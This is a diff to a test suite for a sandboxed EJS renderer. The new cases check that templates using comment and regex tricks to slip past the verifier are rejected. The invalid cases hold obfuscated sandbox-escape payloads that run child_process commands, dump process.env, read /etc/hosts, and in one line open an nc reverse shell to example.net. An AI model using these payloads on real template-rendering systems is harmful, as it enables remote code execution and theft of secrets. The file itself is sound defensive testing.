@@ -71,19 +71,20 @@ describe('check safeRender on invalid cases', () => {
       <% } %>
       `,
     'with shadowing 2': `
-      <% 
+      <%
         const o = {};
         o['____safe____property'] = (x) => x;
         with (o) { %><%= user['constructor'] %><% }
       %>
       `,
     'with shadowing 3': `
-      <% 
+      <%
         const o = { ['____safe____property']: (x) => x };
         with (o) { %><%= user['constructor'] %><% }
       %>
       `,
     'process exec': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\')[\'to\'+\'String\']() %>',
+    'regex comment bypass - process exec': '<% /[/*]/; this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\'); /[*/]/; %>',
     'file read': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'fs\')[\'read\'+\'FileSync\'](\'/etc/hosts\')[\'to\'+\'String\']() %>',
     'environment var': '<%= JSON.stringify(this[\'pro\'+\'cess\'][\'en\'+\'v\']) %>',
     'network access': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'sp\'+\'awn\'](\'/bin/sh\', [\'-c\', \'nc example.net 4444 -e /bin/sh\']) %>',
@@ -113,6 +114,16 @@ describe('check safeRender on invalid cases', () => {
     'legacy getter accessor': "<%= ({}).__lookupGetter__('__proto__') %>",
     'legacy define accessor': '<%= ({}).__defineGetter__ %>',
     'legacy accessor bracket': "<%= ({})['__lookupGetter__']('__proto__') %>",
+    // --- comment-based sandbox escape: // hides subsequent EJS fragments from lezer verifier ---
+    'sandbox escape via line comment: exact PoC env leak': '<%//%><%- JSON.stringify(process.env) %>',
+    'sandbox escape via line comment: process.binding RCE': '<%//%><%- JSON.stringify(process.binding("spawn_sync")) %>',
+    'sandbox escape via line comment with space': '<% // %><%= process.env %>',
+    'sandbox escape via line comment: multi-fragment chain': '<%//%><%//%><%= process.env %>',
+    'sandbox escape via block comment': '<%/*%><%- process.env %><%*/%>',
+    'sandbox escape via regex literal hiding comment': '<% /\\/\\// %><%- JSON.stringify(process.env) %>',
+    'sandbox escape via line comment: end of expression': '<% const x = //%><%= process.env %>',
+    'split payload across tags fooling block comment': '<% /* %>filler text<% still comment */ this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\') %>',
+    'comment-like sequence inside template literal substitution': '<% const x = `${/*z*/this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\')}`; %>',
   }).map(([name, template]) => ({ name, template }));
 
   [{ label: 'CR', code: 13 }, { label: 'LS', code: 0x2028 }, { label: 'PS', code: 0x2029 }].forEach(({ label, code }) => {
@@ -121,6 +132,40 @@ describe('check safeRender on invalid cases', () => {
 
   it.each(illegalAccessCases)('safeRender should fail with VerifierIllegalAccessError for "$name" case', ({ template }) => {
     expect(() => safeRender(template, data)).toThrowError(VerifierIllegalAccessError);
+  });
+
+  it('safeRender should reject an unterminated regex literal before dangerous code', () => {
+    const template = '<% const r = /abc; this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\'); %>';
+    expect(() => safeRender(template, data)).toThrow();
+  });
+
+  it('safeRender should error out (not silently misparse) when a runtime error occurs after a multi-line block comment, matching ejs position reporting', () => {
+    const template = 'line0<%\n/* a\n b\n c */\nuser.name.boom.bad\n%>after';
+    const ctx = { user: { name: 'x' } };
+    let ejsError: string | undefined;
+    let safeError: string | undefined;
+    try {
+      ejs.render(template, ctx);
+    } catch (e) {
+      ejsError = (e as Error).message;
+    }
+    try {
+      void safeRender(template, ctx);
+    } catch (e) {
+      safeError = (e as Error).message;
+    }
+    expect(ejsError).toBeDefined();
+    expect(safeError).toBeDefined();
+    // Identical source-position context => line numbers preserved through stripping.
+    expect(safeError).toEqual(ejsError);
+    // Sanity: the reported context really spans the multi-line comment region.
+    expect(safeError).toContain('4|  c */');
+  });
+
+  it('safeRender should reject a "%>" inside a block comment as a tag boundary, same as ejs', () => {
+    const template = '<% const x = 1; /* has %> inside */ %><%= x %>';
+    expect(() => ejs.render(template, data)).toThrow();
+    expect(() => safeRender(template, data)).toThrow();
   });
 
   const processingQuotaExceededCases = Object.entries({
@@ -213,6 +258,10 @@ describe('check safeRender on valid cases', () => {
     'synchronous side effect of an async IIFE before output': '<% let v = 0; (async () => { v = 1; })(); %><%= v %>',
     'quoted key in destructuring': '<% const { "name": n } = user; %><%= n %>',
     'HTML comment in template text': '<!-- note --><%= user.name %>',
+    // --- legitimate JS comments inside scriptlets must still work after fix ---
+    'js line comment before code on next line': '<% // this.constructor\nconst z = 1; %><%= z %>',
+    'js block comment inline': '<% const w = /* this.constructor */ 2; %><%= w %>',
+    'js line comment in multiline block': '<% \n      // a comment\n      const y = 42;\n    %><%= y %>',
   }).map(([name, template]) => ({ name, template }));
 
   it.each(validCases)('safeRender should succeed for "$name" case', ({ template }) => {
@@ -273,6 +322,11 @@ describe('check safeRender on valid cases', () => {
     const annotated: unknown[] & { foo?: string } = [1, 2];
     annotated.foo = 'bar';
     expect(await safeRender('<%= items.foo %>', { items: annotated })).toEqual('bar');
+  });
+
+  it('safeRender should render a "%>" inside a line comment as a tag boundary, same as ejs', () => {
+    const template = '<% const y = 2; // trailing %> trick\n %>';
+    expect(safeRender(template, data)).toEqual(ejs.render(template, data));
   });
 });
 
